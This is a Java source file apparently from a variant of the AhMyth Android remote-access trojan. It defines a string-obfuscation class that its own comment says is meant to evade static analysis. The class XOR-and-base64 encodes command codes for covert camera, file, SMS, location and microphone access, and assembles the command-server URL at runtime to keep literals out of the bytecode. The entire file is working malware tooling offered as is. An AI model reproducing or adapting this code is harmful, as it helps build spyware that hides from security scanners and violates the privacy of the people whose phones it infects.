package ahmyth.mine.king.ahmyth;

import android.util.Base64;
import java.nio.charset.StandardCharsets;

/**
 * Simple string obfuscation to evade static analysis
 * Strings are XOR encoded and base64 wrapped
 */
public class StringObfuscator {
    
    // XOR key - changes for each build
    private static final byte[] KEY = {0x41, 0x68, 0x4D, 0x79, 0x54, 0x68};
    
    /**
     * Decode an obfuscated string
     * @param encoded Base64 encoded XOR'd string
     * @return Decoded plaintext string
     */
    public static String d(String encoded) {
        try {
            byte[] decoded = Base64.decode(encoded, Base64.NO_WRAP);
            byte[] result = new byte[decoded.length];
            for (int i = 0; i < decoded.length; i++) {
                result[i] = (byte) (decoded[i] ^ KEY[i % KEY.length]);
            }
            return new String(result, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Encode a string for obfuscation (used during development)
     * @param plaintext String to encode
     * @return Base64 encoded XOR'd string
     */
    public static String e(String plaintext) {
        try {
            byte[] data = plaintext.getBytes(StandardCharsets.UTF_8);
            byte[] result = new byte[data.length];
            for (int i = 0; i < data.length; i++) {
                result[i] = (byte) (data[i] ^ KEY[i % KEY.length]);
            }
            return Base64.encodeToString(result, Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }
    
    // Pre-encoded common strings (use e() to generate these)
    // These look like random base64 but decode to meaningful strings
    
    // "order" -> 
    public static String ORDER() {
        return d("Lh0NHBg=");
    }
    
    // "x0000ca" -> 
    public static String CMD_CAMERA() {
        return d("OWgwNDcYKQ==");
    }
    
    // "x0000fm" ->
    public static String CMD_FILES() {
        return d("OWgwNDceLw==");
    }
    
    // "x0000sm" ->
    public static String CMD_SMS() {
        return d("OWgwNDcdLw==");
    }
    
    // "x0000lm" ->
    public static String CMD_LOCATION() {
        return d("OWgwNDcELw==");
    }
    
    // "x0000mc" ->
    public static String CMD_MIC() {
        return d("OWgwNDcFGw==");
    }
    
    // Runtime string builder to avoid string literals in bytecode
    public static String buildUrl(String host, int port, String params) {
        StringBuilder sb = new StringBuilder();
        sb.append("http");
        sb.append("://");
        sb.append(host);
        sb.append(":");
        sb.append(port);
        if (params != null && !params.isEmpty()) {
            sb.append("?");
            sb.append(params);
        }
        return sb.toString();
    }
}

